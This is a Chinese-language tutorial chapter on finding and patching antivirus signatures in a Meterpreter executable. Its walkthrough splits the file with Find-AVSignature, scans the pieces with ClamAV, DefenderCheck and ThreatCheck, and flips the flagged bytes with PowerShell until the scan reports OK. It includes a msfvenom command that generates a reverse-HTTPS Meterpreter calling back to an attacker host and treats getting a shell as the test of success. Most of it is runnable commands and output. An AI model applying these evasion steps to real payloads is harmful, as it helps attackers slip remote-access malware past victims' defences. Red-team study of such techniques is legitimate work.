# 定位杀软签名详解

## 写在前面

定位杀软签名是绕过杀软的第一步。本章详细介绍如何使用 Find-AVSignature 和其他工具定位杀软签名，以及如何修改签名来绕过检测。

---

## 一、签名检测原理

### 1.1 什么是签名

```
杀软签名:

签名是杀软用来识别恶意软件的特征码，通常是:
- 特定的字节序列
- 特定的字符串
- 特定的代码模式

例如:
- Meterpreter 的特定字节序列
- "powershell.exe" 字符串
- 特定的 API 调用模式
```

### 1.2 签名检测流程

```
签名检测流程:

1. 杀软读取文件内容
2. 将文件内容与签名库比对
3. 如果匹配，标记为恶意
4. 如果不匹配，继续其他检测

┌─────────────────────────────────────────────────────────────┐
│  文件内容: 0xFC 0x48 0x83 0xE4 0xF0 ...                     │
│                    ↓                                        │
│  签名库: 0xFC 0x48 0x83 0xE4 0xF0 = Meterpreter            │
│                    ↓                                        │
│  结果: 检测到恶意软件                                        │
└─────────────────────────────────────────────────────────────┘
```

## 二、使用 Find-AVSignature

### 2.1 工具介绍

```
Find-AVSignature 是 PowerSploit 中的工具，用于定位杀软签名。

原理:
1. 将文件分割成多个片段
2. 分别扫描每个片段
3. 找出被检测的片段
4. 逐步缩小范围，定位具体字节
```

### 2.2 基本用法

```powershell
# 导入模块
Import-Module .\Find-AVSignature.ps1

# 基本用法
Find-AVSignature -StartByte 0 -EndByte 10000 -Interval 1000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest -Verbose

# 参数说明:
# -StartByte: 起始字节
# -EndByte: 结束字节
# -Interval: 分割间隔
# -Path: 目标文件
# -OutPath: 输出目录
# -Verbose: 显示详细信息
# -Force: 覆盖已存在的文件
```

### 2.3 分步定位流程

```
步骤 1: 粗略分割 (1000 字节间隔)

PS> Find-AVSignature -StartByte 0 -EndByte 73802 -Interval 1000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force

输出:
C:\Tools\avtest1\met_0.bin
C:\Tools\avtest1\met_1000.bin
C:\Tools\avtest1\met_2000.bin
...

步骤 2: 扫描分割后的文件

PS> clamscan.exe C:\Tools\avtest1

输出:
C:\Tools\avtest1\met_0.bin: OK
C:\Tools\avtest1\met_1000.bin: OK
...
C:\Tools\avtest1\met_18000.bin: OK
C:\Tools\avtest1\met_19000.bin: Win.Trojan.Swrort-5710536-0 FOUND
...

结论: 签名在 18000-19000 字节范围内
```

### 2.4 逐步缩小范围

```
步骤 3: 细分 (100 字节间隔)

PS> Find-AVSignature -StartByte 18000 -EndByte 19000 -Interval 100 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest2 -Verbose -Force

PS> clamscan.exe C:\Tools\avtest2

输出:
C:\Tools\avtest2\met_18800.bin: OK
C:\Tools\avtest2\met_18900.bin: Win.Trojan.Swrort-5710536-0 FOUND
...

结论: 签名在 18800-18900 字节范围内

步骤 4: 更细分 (10 字节间隔)

PS> Find-AVSignature -StartByte 18800 -EndByte 18900 -Interval 10 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest3 -Verbose -Force

PS> clamscan.exe C:\Tools\avtest3

输出:
C:\Tools\avtest3\met_18860.bin: OK
C:\Tools\avtest3\met_18870.bin: Win.Trojan.Swrort-5710536-0 FOUND
...

结论: 签名在 18860-18870 字节范围内

步骤 5: 精确定位 (1 字节间隔)

PS> Find-AVSignature -StartByte 18860 -EndByte 18870 -Interval 1 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest4 -Verbose -Force

PS> clamscan.exe C:\Tools\avtest4

输出:
C:\Tools\avtest4\met_18866.bin: OK
C:\Tools\avtest4\met_18867.bin: Win.Trojan.Swrort-5710536-0 FOUND
...

结论: 签名从字节 18867 开始
```

## 三、修改签名

### 3.1 使用 PowerShell 修改字节

```powershell
# 读取文件
$bytes = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")

# 修改特定字节
$bytes[18867] = 0

# 写入新文件
[System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes)
```

### 3.2 处理多个签名

```powershell
# 如果有多个签名，需要逐个处理

# 读取文件
$bytes = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")

# 修改第一个签名
$bytes[18867] = 0

# 修改第二个签名
$bytes[18987] = 0

# 修改第三个签名
$bytes[73801] = 0xFF

# 写入新文件
[System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes)
```

### 3.3 验证修改效果

```powershell
# 扫描修改后的文件
PS> clamscan.exe C:\Tools\met_mod.exe

输出:
C:\Tools\met_mod.exe: OK

# 成功绕过签名检测！
```

## 四、签名修改的问题

### 4.1 功能破坏

```
问题:

修改签名字节可能破坏程序功能:
- 签名可能是代码的一部分
- 修改后程序可能无法运行
- 需要逆向工程确定安全的修改方式

解决方案:
- 测试修改后的程序是否正常工作
- 如果不工作，尝试修改相邻字节
- 或者使用其他绕过技术（加密、混淆）
```

### 4.2 多杀软检测

```
问题:

不同杀软有不同的签名:
- 绕过 ClamAV 不一定能绕过 Avira
- 需要针对每个杀软分别处理

解决方案:
- 使用多个杀软测试
- 使用 AntiScan.Me 等服务
- 使用加密/混淆而不是直接修改签名
```

## 五、其他定位工具

### 5.1 DefenderCheck

```bash
# DefenderCheck 专门针对 Windows Defender

.\DefenderCheck.exe payload.exe

输出:
[*] Target file size: 73802 bytes
[*] Analyzing...
[!] Identified end of bad bytes at offset 0x49AB
[*] Run again with the -o flag to output the identified bytes
```

### 5.2 ThreatCheck

```bash
# ThreatCheck 是 DefenderCheck 的改进版

.\ThreatCheck.exe -f payload.exe

输出:
[+] Target file size: 73802 bytes
[+] Analyzing...
[!] Identified bad bytes starting at offset 0x49AB
[*] Bytes:
    FC 48 83 E4 F0 E8 C0 00 00 00 41 51 41 50 52 51
    ...
```

### 5.3 手动二分法

```
如果没有工具，可以手动使用二分法:

1. 将文件分成两半
2. 分别扫描
3. 找出被检测的那一半
4. 继续分割
5. 重复直到定位到具体字节
```

## 六、实际案例

### 6.1 定位 Meterpreter 签名

```powershell
# 生成 Meterpreter
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe -o met.exe

# 第一轮扫描
Find-AVSignature -StartByte 0 -EndByte 73802 -Interval 1000 -Path met.exe -OutPath avtest1 -Force
clamscan.exe avtest1

# 发现签名在 18000-19000 范围

# 第二轮扫描
Find-AVSignature -StartByte 18000 -EndByte 19000 -Interval 100 -Path met.exe -OutPath avtest2 -Force
clamscan.exe avtest2

# 发现两个签名:
# - 18800-18900: Win.Trojan.Swrort-5710536-0
# - 18900-19000: Win.Trojan.MSShellcode-7

# 继续细分定位...
```

### 6.2 修改签名

```powershell
# 定位到具体字节后
$bytes = [System.IO.File]::ReadAllBytes("met.exe")
$bytes[18867] = 0
$bytes[18987] = 0
$bytes[73801] = 0xFF
[System.IO.File]::WriteAllBytes("met_mod.exe", $bytes)

# 验证
clamscan.exe met_mod.exe
# 输出: OK

# 测试功能
# 启动 handler，运行 met_mod.exe
# 如果获得 shell，说明修改成功
```

## 七、为什么推荐加密而不是修改签名

### 7.1 修改签名的缺点

```
缺点:

1. 可能破坏功能
   - 需要逆向工程
   - 耗时耗力

2. 不同杀软有不同签名
   - 需要针对每个杀软处理
   - 工作量大

3. 签名会更新
   - 今天绕过，明天可能被检测
   - 需要持续维护

4. 不适用于脚本
   - 脚本是文本，修改会破坏语法
```

### 7.2 加密的优点

```
优点:

1. 不破坏功能
   - 只是加密，解密后完全相同

2. 通用性强
   - 一次加密，绕过多个杀软

3. 易于维护
   - 只需更换密钥

4. 适用于所有类型
   - 二进制、脚本都可以
```
